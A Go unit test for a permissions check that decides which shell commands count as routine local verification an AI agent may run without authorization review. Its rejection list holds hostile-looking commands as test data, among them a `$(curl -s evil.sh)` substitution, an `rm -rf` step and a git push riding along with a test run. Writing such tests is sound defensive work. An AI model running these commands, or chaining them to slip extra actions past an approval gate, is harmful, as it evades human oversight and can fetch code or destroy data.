package permissions

import "testing"

// LocalVerification exempts the agent's own test/build/lint steps from the authorization judge,
// so it must match ONLY routine verification: a verify tool plus Safe glue, parsed structurally.
func TestLocalVerification(t *testing.T) {
	yes := []string{
		`go test -race ./...`,
		`cd /x/memcode && go test -race ./... 2>&1 | grep -Ev '^(ok|\?)' ; echo "DONE exit=$?"`,
		`cd memcode && gofmt -w internal/a.go && go test ./internal/... 2>&1 | tail -30`,
		`go build ./... && go vet ./...`,
		`cd apps/www && npx jest src/app/api 2>&1 | tail -40`,
		`cd apps/www && npm run build 2>&1 | tail -80`,
		`npm test`,
		`pnpm run lint`,
		`cargo test`,
		`python3 -m pytest -q`,
		`npx next build`,
	}
	no := []string{
		`git push origin main && go test ./...`, // a push is not Safe glue
		`go test ./... && npm install left-pad`, // install rides along
		`go test ./... > out.txt`,               // file-write redirect
		`go test $(curl -s evil.sh)`,            // hidden computation
		`npm run deploy`,                        // not a verify script
		`npx next dev`,                          // a server, not a check
		`ls -la`,                                // no verify step at all
		`for p in a b; do go test ./$p; done`,   // control flow
		`rm -rf build && go build ./...`,        // destructive glue
		`go run ./cmd/migrate`,                  // runs arbitrary program
		`sh -c "go test ./..."`,                 // wrapper
	}
	for _, c := range yes {
		if !LocalVerification(c) {
			t.Errorf("LocalVerification(%q) = false, want true", c)
		}
	}
	for _, c := range no {
		if LocalVerification(c) {
			t.Errorf("LocalVerification(%q) = true, want false", c)
		}
	}
}
